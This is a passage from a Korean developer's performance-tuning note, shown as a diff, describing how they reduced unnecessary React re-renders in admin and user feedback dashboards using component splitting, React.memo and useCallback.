+`AdminDashboard` 코드를 보니, `AdminDashboard` 컴포넌트에서 데이터 로딩하는 로직이 작성되어있어, 무한스크롤로 데이터 로딩시 모든 컴포넌트가 리렌더링이 발생하고 있다.
+
+```tsx
+export function AdminDashBoard(){
+	... 여러가지 코드
+
+	const apiUrl = createFeedbacksUrl({
+    organizationId,
+    sort: selectedSort,
+    filter: selectedFilter,
+    isAdmin: true,
+  });
+
+  const {
+    items: feedbacks,
+    fetchMore,
+    hasNext,
+    loading,
+  } = useCursorInfiniteScroll<
+    FeedbackType,
+    'feedbacks',
+    FeedbackResponse<FeedbackType>
+  >({
+    url: apiUrl,
+    key: 'feedbacks',
+    size: 10,
+  });
+
+	useGetFeedback({ fetchMore, hasNext, loading });
+
+	return (
+	    <section css={dashboardLayout}>
+	      <DashboardOverview />
+
+	      <FilterSection
+	        selectedFilter={selectedFilter}
+	        onFilterChange={handleFilterChange}
+	        selectedSort={selectedSort}
+	        onSortChange={handleSortChange}
+	        isAdmin={true}
+	      />
+
+
+	      <FeedbackBoxList>
+	        {feedbacks.map((feedback) => (
+	          <AdminFeedbackBox
+	            key={feedback.feedbackId}
+	            feedbackId={feedback.feedbackId}
+	            onConfirm={openFeedbackCompleteModal}
+	            onDelete={openFeedbackDeleteModal}
+	            type={feedback.status}
+	            content={feedback.content}
+	            postedAt={feedback.postedAt}
+	            isSecret={feedback.isSecret}
+	            likeCount={feedback.likeCount}
+	            userName={feedback.userName}
+	            category={feedback.category}
+	            comment={feedback.comment}
+	          />
+	        ))}
+	      </FeedbackBoxList>
+
+	      <FeedbackStatusMessage
+	        loading={loading}
+	        filterType={selectedFilter as FeedbackFilterType}
+	        hasNext={hasNext}
+	        feedbackCount={feedbacks.length}
+	      />
+
+	      {hasNext && <div id='scroll-observer' style={{ minHeight: '1px' }} />}
+	      ...
+	  }
+  }
+```
+
+사실 데이터 패칭 로직이 `AdminDashboard`에 있을 이유가 없다. 데이터가 필요한 곳은 **피드백 리스트**이므로, 데이터 패칭 로직을 피드백 리스트 컴포넌트 내부로 옮겨보자. 우선, 그러기 위해서는 무한스크롤을 감지하는 요소와 모두 보았을 때 나오는 ui도 피드백 리스트 컴포넌트로 내부로 옮기자.
+
+근데 `FeedbackBoxList` 컴포넌트는 단지 스타일만 가지는 컴포넌트다. 이렇게 만든 이유는 사용자와 관리자 대시보드 모두 필요한 컴포넌트이므로 이렇게 구현했다. 따라서, `FeedbackBoxList`에서 관리자 데이터 패칭을 진행하면 사용자 대시보드에서 재사용을 하지 못하므로, `AdminFeedbackList` 라는 컴포넌트를 하나 만들어서 `FeedbackBoxList`를 **랩핑하였다.**
+
+```tsx
+export default function AdminFeedbackList({
+  selectedFilter,
+  selectedSort,
+  openFeedbackCompleteModal,
+  openFeedbackDeleteModal,
+}: AdminFeedbackListProps) {
+  const { organizationId } = useOrganizationId();
+
+  const apiUrl = createFeedbacksUrl({
+    organizationId,
+    sort: selectedSort,
+    filter: selectedFilter,
+    isAdmin: true,
+  });
+
+  const {
+    items: feedbacks,
+    fetchMore,
+    hasNext,
+    loading,
+  } = useCursorInfiniteScroll<
+    FeedbackType,
+    "feedbacks",
+    FeedbackResponse<FeedbackType>
+  >({
+    url: apiUrl,
+    key: "feedbacks",
+    size: 10,
+  });
+
+  useGetFeedback({ fetchMore, hasNext, loading });
+
+  return (
+    <div>
+      <FeedbackBoxList>
+        {feedbacks.map((feedback) => (
+          <AdminFeedbackBox
+            key={feedback.feedbackId}
+            feedbackId={feedback.feedbackId}
+            onConfirm={openFeedbackCompleteModal}
+            onDelete={openFeedbackDeleteModal}
+            type={feedback.status}
+            content={feedback.content}
+            postedAt={feedback.postedAt}
+            isSecret={feedback.isSecret}
+            likeCount={feedback.likeCount}
+            userName={feedback.userName}
+            category={feedback.category}
+            comment={feedback.comment}
+          />
+        ))}
+      </FeedbackBoxList>
+      <div>
+        <FeedbackStatusMessage
+          loading={loading}
+          filterType={selectedFilter as FeedbackFilterType}
+          hasNext={hasNext}
+          feedbackCount={feedbacks.length}
+        />
+
+        {hasNext && <div id="scroll-observer" style={{ minHeight: "1px" }} />}
+      </div>
+    </div>
+  );
+}
+```
+
+이제 `AdminFeedbackList` 컴포넌트에 데이터 패칭 로직이 옮겨지면서 `AdminDashBaord` 컴포넌트의 역할이 훨씬 줄어들었고 코드도 깔끔해졌다.
+
+```tsx
+<AdminFeedbackList
+  selectedFilter={selectedFilter}
+  selectedSort={selectedSort}
+  openFeedbackCompleteModal={openFeedbackCompleteModal}
+  openFeedbackDeleteModal={openFeedbackDeleteModal}
+/>
+```
+
+`AdminDashBoard` 컴포넌트에서 위와 같이 `AdminFeedbackList`만 호출하면 된다.
+
+이렇게 하고 다시 profiler를 측정하면 아래와 같다.
+
+![image.png](attachment:8ba2743a-6380-4217-a04c-c4ceff5ef12d:image.png)
+
+방금 `AdminDashBoard` 전체가 리렌더링이 된것과 달리, 지금은 `AdminFeedbackList` 컴포넌트만 리렌더링이 발생하고 있다!
+
+### 새로운 피드백 로딩시 기존 피드백 리렌더링이 되는 문제
+
+`AdminDashBoard` 전체가 리렌더링되는 문제는 해결했는데, 새로운 피드백 로딩시 기존 피드백이 리렌더링되는 문제는 해결하지 못했다.
+
+이를 해결하기 위해, props가 변경되지 않으면 리렌더링이 발생하지 않도록 하기 위해 `React.memo`를 사용했다.
+
+![image.png](attachment:3333e485-bd5d-4fb1-8dd6-9a27a5dd5102:image.png)
+
+이렇게 했을 때 새로 데이터를 불러오는 피드백 컴포넌트만 리렌더링이 발생한 것을 볼 수 있다!!!!!
+
+## 액션 버튼 눌렀을 때 과도한 리렌더링 문제
+
+관리자가 피드백의 삭제버튼과 완료 버튼을 눌렀을 때 과도한 리렌더링이 발생한다.
+
+[화면 기록 2025-09-16 13.54.53.mov](attachment:203b67ee-d7ed-422b-9fca-f29cf4435365:화면_기록_2025-09-16_13.54.53.mov)
+
+![image.png](attachment:42bc9044-dc6b-4152-8776-8034c206f9f2:image.png)
+
+삭제 버튼을 눌렀을 때 모든 컴포넌트가 리렌더링되는 것을 볼 수 있다.
+
+우선 모달창을 열 때 리렌더링되면 안되는 요소인 `피드백 리스트`, `통계`, `필터` 의 리렌더링을 막아보자.
+
+우선 각각의 요소에 `React.memo`를 적용하여 부모 컴포넌트가 리렌더링이 발생하더라도, props가 변경되지 않으면 리렌더링이 되지 않도록 한다.
+
+[화면 기록 2025-09-16 14.13.35.mov](attachment:ba129f4c-d05a-4e74-941b-2ea56db7b278:화면_기록_2025-09-16_14.13.35.mov)
+
+![image.png](attachment:a125fe1e-9d90-4bb8-ae6c-bd4ee4fb084b:image.png)
+
+이렇게 적용했을 때 통계와 필터 영역은 리렌더링이 발생하지 않지만, `AdminFeedbackList`는 리렌더링이 발생하는 것을 볼 수 있다. 그이유는
+
+모달을 여는 역할을 하는 함수인 `openFeedbackCompleteModal`, `openFeedbackDeleteModal` 함수를 리턴하는 훅인 `useAdminModal` 이 `AdminDashboard` 컴포넌트가 매번 리랜더링될 때마다 재실행되면서, 모달을 여는 역할하는 함수들이 재생성 된다.
+
+```
+ <AdminFeedbackList
+        selectedFilter={selectedFilter}
+        selectedSort={selectedSort}
+        openFeedbackCompleteModal={openFeedbackCompleteModal}
+        openFeedbackDeleteModal={openFeedbackDeleteModal}
+      />
+```
+
+위 코드와 같이 매번 재생성되는 함수를 props로 넘기게 되면서 `AdminFeedbackList`의 **`props`**가 **리렌더링마다 변경되면서 리렌더링이 발생한다.**
+
+그래서 이를 막기 위해서, 훅에서 반환하는 함수들에 `useCallback`을 사용하여 의존성 배열이 변경되지 않으면 리렌더링 발생하지 않도록 했다.
+
+이렇게 하고 결과를 보면
+
+[화면 기록 2025-09-16 14.19.15.mov](attachment:7cd5f885-56b2-47b5-8177-7809f9c2ae32:화면_기록_2025-09-16_14.19.15.mov)
+
+![image.png](attachment:b7e1a23a-3530-4a38-9be4-66fffec8c4b9:image.png)
+
+짠! 이제는 딱 필요한 부분인 `ConfirmModal`만 렌더링되는 것을 확인할 수 있다.
+
+## 응원 버튼 눌렀을 때 통계 전체가 리렌더링 되는 문제
+
+응원버튼을 눌렀을 때 리렌더링이 불필요한 통계 컴포넌트가 리렌더링이 발생하고 있다.
+
+[화면 기록 2025-09-16 14.34.38.mov](attachment:64ddbe5e-6b63-491b-8263-312f73d0ca53:화면_기록_2025-09-16_14.34.38.mov)
+
+![image.png](attachment:74df4d1d-1a5f-4353-832d-ffe70477ef01:image.png)
+
+왜 이런가 살펴보니, `DashboardOverview.tsx`에서 응원하기 데이터와 통계 데이터를 불러오고 있다. 그러다 보니, 응원하기 데이터가 변경되어도 통계 컴포넌트가 리렌더링이 발생하는 것이였다.
+
+그래서 이를 해결하기 위해, `OverviewHeader`라는 **랩핑 컴포넌트**를 만들어, **groupName, 응원하기 데이터를 가져왔다.**
+
+```tsx
+export default function OverviewHeader() {
+  const { organizationId } = useOrganizationId();
+
+  // 조직 이름, 응원하기 정보 데이터 가져오기
+  const { groupName, totalCheeringCount } = useOrganizationName({
+    organizationId,
+  });
+  const { handleCheerButton, animate } = useCheerButton({
+    organizationId,
+  });
+
+  return (
+    <div css={headerContainer}>
+      <div css={headerText}>
+        <p css={titleText(theme)}>{groupName}</p>
+        <p css={panelCaption(theme)}>지금까지의 피드백</p>
+      </div>
+      <div css={headerCheerButton}>
+        <div css={cheerButtonLayout}>
+          <CheerButton
+            totalCheeringCount={totalCheeringCount}
+            onClick={handleCheerButton}
+            animate={animate}
+          />
+        </div>
+      </div>
+    </div>
+  );
+}
+```
+
+해당 컴포넌트를, `DashboardOverview`에서 불러와서 사용한다.
+
+```tsx
+import DashboardPanel from "@/domains/components/DashboardPanel/DashboardPanel";
+import { useAppTheme } from "@/hooks/useAppTheme";
+import useUserOrganizationsStatistics from "@/domains/hooks/useUserOrganizationsStatistics";
+
+import { useOrganizationId } from "@/domains/hooks/useOrganizationId";
+import { panelLayout } from "./DashboardOverview.style";
+import OverviewHeader from "./OverviewHeader";
+
+export default function DashboardOverview() {
+  const { organizationId } = useOrganizationId();
+  const theme = useAppTheme();
+  const { statistics } = useUserOrganizationsStatistics({
+    organizationId,
+  });
+  return (
+    <>
+      **
+      <OverviewHeader />
+      **
+      <div css={panelLayout}>
+        {DASH_PANELS.map((panel, idx) => (
+          <DashboardPanel
+            key={idx}
+            title={panel.title}
+            content={panel.content}
+            caption={panel.caption}
+            color={panel.color}
+          />
+        ))}
+      </div>
+    </>
+  );
+}
+```
+
+이렇게 했을 때 `DashboardOverview`에서 `DashboardPanel`은 반복문으로 사용하는 것이 어색해서 해당 부분도 `DashboardPanelContent` 컴포넌트로 분리했다.
+
+```tsx
+import OverviewHeader from "./OverviewHeader/OverviewHeader";
+import DashboardPanelContent from "./DashboardPanelContent/DashboardPanelContent";
+import React from "react";
+
+function DashboardOverview() {
+  return (
+    <>
+      <OverviewHeader />
+      <DashboardPanelContent />
+    </>
+  );
+}
+
+export default React.memo(DashboardOverview);
+```
+
+그러면 `DashboardOverview`가 이렇게 바뀐다!
+
+[화면 기록 2025-09-16 14.53.56.mov](attachment:be961846-9012-4b92-b58d-bbe1fb9b11f8:화면_기록_2025-09-16_14.53.56.mov)
+
+![image.png](attachment:b3442553-12b4-486e-9291-a8e0ae75935f:image.png)
+
+이제 응원버튼을 눌렀을 때 해당 부분만 변경되는 것을 볼 수 있다
+
+## 더보기 버튼 눌렀을 때 리렌더링 되는 문제
+
+[화면 기록 2025-09-16 15.16.35.mov](attachment:185c7d03-ba46-408b-8a6a-7fe462397d2c:화면_기록_2025-09-16_15.16.35.mov)
+
+![image.png](attachment:54875d57-4b7e-4503-afe7-ba6740f3b82f:image.png)
+
+더보기 버튼을 클릭하는데 뒤로가기 버튼, 텍스트가 리렌더링되는 것을 볼 수 있다.
+
+`Header` 코드를 보면 아래와 같다.
+
+```tsx
+import { useAppTheme } from "@/hooks/useAppTheme";
+import MoreVerticalIcon from "../icons/MoreVerticalIcon";
+import {
+  arrowTitleContainer,
+  captionSection,
+  header,
+  headerSection,
+  headerSubtitle,
+  headerTitle,
+  MoreButton,
+  moreMenu,
+  moreMenuContainer,
+} from "./Header.style";
+
+import Button from "../@commons/Button/Button";
+
+import ArrowLeftIcon from "../icons/ArrowLeftIcon";
+import MoreMenu from "@/components/Header/MoreMenu/MoreMenu";
+import useMoreMenuManager from "@/components/Header/hooks/useMoreMenuManager";
+import { useLayoutConfig } from "@/hooks/useLayoutConfig";
+import useNavigation from "@/domains/hooks/useNavigation";
+
+export default function Header() {
+  const theme = useAppTheme();
+  const { goBack } = useNavigation();
+  const { layoutConfig } = useLayoutConfig();
+
+  const { isOpenMoreMenu, toggleMoreMenu, moreButtonRef, closeMoreMenu } =
+    useMoreMenuManager();
+
+  const { title, subtitle, hasMoreIcon, showBackButton } = layoutConfig.header;
+
+  return (
+    <header css={header(theme)}>
+      <div css={arrowTitleContainer}>
+        {showBackButton && (
+          <Button onClick={goBack}>
+            <ArrowLeftIcon color={theme.colors.white[100]} />
+          </Button>
+        )}
+        <div css={headerSection}>
+          <div css={captionSection}>
+            <p css={headerTitle(theme)}>{title}</p>
+            <p css={headerSubtitle(theme)}>{subtitle}</p>
+          </div>
+        </div>
+      </div>
+      {hasMoreIcon && (
+        <div
+          css={moreMenuContainer}
+          ref={moreButtonRef as React.RefObject<HTMLDivElement>}
+        >
+          <Button onClick={toggleMoreMenu} customCSS={MoreButton}>
+            <MoreVerticalIcon />
+          </Button>
+          {isOpenMoreMenu && (
+            <div css={moreMenu}>
+              <MoreMenu closeMoreMenu={closeMoreMenu} />
+            </div>
+          )}
+        </div>
+      )}
+    </header>
+  );
+}
+```
+
+문제는 더보기 관련 상태가 `Header`컴포넌트에 그대로 노출되어 있어, 더보기 버튼을 눌렀을 때 `Header` 컴포넌트 전체가 리렌더링되는 것이었다.
+
+이것도 아까와 똑같이 **컴포넌트로 분리하고 분리한 컴포넌트 내부에서만 상태가 변경되도록 변경**해보자.
+
+```tsx
+{
+  hasMoreIcon && (
+    <div
+      css={moreMenuContainer}
+      ref={moreButtonRef as React.RefObject<HTMLDivElement>}
+    >
+      <Button onClick={toggleMoreMenu} customCSS={MoreButton}>
+        <MoreVerticalIcon />
+      </Button>
+      {isOpenMoreMenu && (
+        <div css={moreMenu}>
+          <MoreMenu closeMoreMenu={closeMoreMenu} />
+        </div>
+      )}
+    </div>
+  );
+}
+```
+
+```tsx
+{
+  hasMoreIcon && <HeaderMoreIcon />;
+}
+```
+
+이렇게 컴포넌트를 분리하고 다시 측정하면 해결된다!
+
+[화면 기록 2025-09-16 15.24.53.mov](attachment:2540ec8a-1a48-4397-b9d0-db57cf28f7ff:화면_기록_2025-09-16_15.24.53.mov)
+
+![image.png](attachment:df124758-9fac-4c91-8d5e-687e27a7d819:image.png)
+
+---
+
+# 사용자
+
+## 무한스크롤 시 피드백 리스트 전체 리렌더링되는 문제
+
+[화면 기록 2025-09-16 15.33.05.mov](attachment:cd28b71e-1ae9-433a-ae01-4bf8765814b2:화면_기록_2025-09-16_15.33.05.mov)
+
+![image.png](attachment:155b46b2-7882-490e-bb9a-db741ef1af77:image.png)
+
+사용자 대시보드 페이지에서도 동일하게 피드백 리스트를 불러올때 과도한 리렌더링이 발생하고 있다.
+
+관리자 대시보드와 똑같이 사용자 대시보드에서도 `UserFeedbackList` **컴포넌트를 만들어 해당 컴포넌트에서 데이터 패칭하는 로직을 작성**하고 `UserFeedbackBox`에 `react.memo`를 적용해보자.
+
+그러면 아래와 같이 사용자 대시보드 컴포넌트가 작성된다.
+
+```tsx
+return (
+  <div css={dashboardLayout}>
+    <DashboardOverview />
+    <FilterSection
+      selectedFilter={selectedFilter}
+      onFilterChange={handleFilterChange}
+      selectedSort={selectedSort}
+      onSortChange={handleSortChange}
+      isAdmin={false}
+    />
+    <UserFeedbackList
+      selectedFilter={selectedFilter}
+      selectedSort={selectedSort}
+    />
+    <FloatingButton
+      icon={<ArrowIcon />}
+      onClick={handleNavigateToOnboarding}
+      inset={{ bottom: "32px", left: "100%" }}
+      customCSS={goOnboardButton(theme)}
+    />
+    {showButton && (
+      <FloatingButton
+        icon={<ArrowUpIcon />}
+        onClick={scrollToTop}
+        inset={{ bottom: "32px" }}
+        customCSS={goTopButton(theme)}
+      />
+    )}
+  </div>
+);
+```
+
+이렇게 하고 다시 측정했는데 **똑같이 과도한 리렌더링이 발생한다…**
+
+왜 그런가 `React Devtools profier`를 자세히 보니
+
+![image.png](attachment:b6069911-dbb0-405c-aa78-f8be8318c762:image.png)
+
+요기 `props`가 변경되어서 렌더링이 발생했다는 것을 알 수 있다. 그중 `customCSS`가 **매번 변경되는 것**을 알 수 있다.
+
+```tsx
+ <FeedbackBoxList>
+          {displayFeedbacks.map((feedback: FeedbackType) => (
+            <UserFeedbackBox
+              userName={feedback.userName}
+              key={feedback.feedbackId}
+              type={feedback.status}
+              content={feedback.content}
+              postedAt={feedback.postedAt}
+              isLiked={getFeedbackIsLike(feedback.feedbackId) || false}
+              isSecret={feedback.isSecret}
+              feedbackId={feedback.feedbackId}
+              likeCount={feedback.likeCount}
+              comment={feedback.comment}
+              isMyFeedback={myFeedbacks.some(
+                (myFeedback) => myFeedback.feedbackId === feedback.feedbackId
+              )}
+              **customCSS={[
+                feedback.feedbackId === highlightedId ? highlightStyle : null,
+              ]}**
+              category={feedback.category}
+            />
+          ))}
+        </FeedbackBoxList>
+```
+
+위 코드를 보면 `customCSS`를 배열로 넘겨주는데 **이게 매번 새로 계산되면서 새로운 배열**이 `props`로 넘어가면서 발생한 문제다.
+
+이를 해결하기 위해서, `UserFeedbackBox`에 `customCSS`를 계산해서 넘겨주던 코드를 `isHighlighted`라는 `props`를 넘기는 방식으로 수정하고, `UserFeedbackBox`에서 `isHighlighted`값에 따라 CSS를 적용해주는 방식으로 수정했다.
+
+```tsx
+  <FeedbackBoxList>
+          {displayFeedbacks.map((feedback: FeedbackType) => (
+            <UserFeedbackBox
+              userName={feedback.userName}
+              key={feedback.feedbackId}
+              type={feedback.status}
+              content={feedback.content}
+              postedAt={feedback.postedAt}
+              isLiked={getFeedbackIsLike(feedback.feedbackId) || false}
+              isSecret={feedback.isSecret}
+              feedbackId={feedback.feedbackId}
+              likeCount={feedback.likeCount}
+              comment={feedback.comment}
+              isMyFeedback={myFeedbacks.some(
+                (myFeedback) => myFeedback.feedbackId === feedback.feedbackId
+              )}
+              **isHighlighted={feedback.feedbackId === highlightedId}**
+              category={feedback.category}
+            />
+          ))}
+        </FeedbackBoxList
+```
+
+```tsx
+
+function UserFeedbackBox({
+...
+}: UserFeedbackBox) {
+
+  return (
+    <FeedbackBoxBackGround
+      type={type}
+      // css로직을 여기서 결정
+      **customCSS={[isHighlighted ? highlightStyle : null]}**
+    >
+      <FeedbackBoxHeader
+        userName={userName + (isMyFeedback ? ' (나)' : '')}
+        type={type}
+        feedbackId={feedbackId}
+        category={category}
+      />
+      <div css={isSecret ? secretText(theme) : undefined}>
+        {isSecret ? (
+          isMyFeedback ? (
+            <FeedbackText type={type} text={content} />
+          ) : (
+            <p>비밀글입니다.</p>
+          )
+        ) : (
+          <FeedbackText type={type} text={content} />
+        )}
+        {isSecret && <LockIcon />}
+      </div>
+      {(!isSecret || isMyFeedback) && type === 'CONFIRMED' && comment && (
+        <FeedbackAnswer answer={comment} />
+      )}
+
+      <FeedbackBoxFooter
+        type={type}
+        isLiked={isLiked}
+        postedAt={postedAt}
+        isSecret={isSecret}
+        feedbackId={feedbackId}
+        likeCount={likeCount}
+      />
+    </FeedbackBoxBackGround>
+  );
+}
+
+export default React.memo(UserFeedbackBox);
+
+```
+
+이렇게 하고 측정하면 해결된다!
+
+[화면 기록 2025-09-16 16.21.59.mov](attachment:9bea61f8-8099-4d35-84e2-d6fc48ee2e25:화면_기록_2025-09-16_16.21.59.mov)
+
+![image.png](attachment:c128fe52-024d-4ef8-a3cf-9b5b31390d1d:image.png)
+
+---
+
+# 개발자 도구 성능 탭 비교
+
+![개선 전](attachment:16c96ab9-e317-40b8-8717-31b08b6f8351:image.png)
+
+개선 전
+
+![개선 후](attachment:e5bb57cb-cdfb-41b8-aa45-ee2e332f322e:image.png)
+
+개선 후
+
+실제로 fram drop이 많이 사라졌고, 무거운 작업도 많이 사라진것을 볼 수 있다!!
+
+![image.png](attachment:1a6bfa4d-403f-4add-8a6d-cc73ca8f4da5:image.png)
+
+[]()
+
+![image.png](attachment:a652b336-9e3e-483f-bb31-6cdfe8b478ae:image.png)
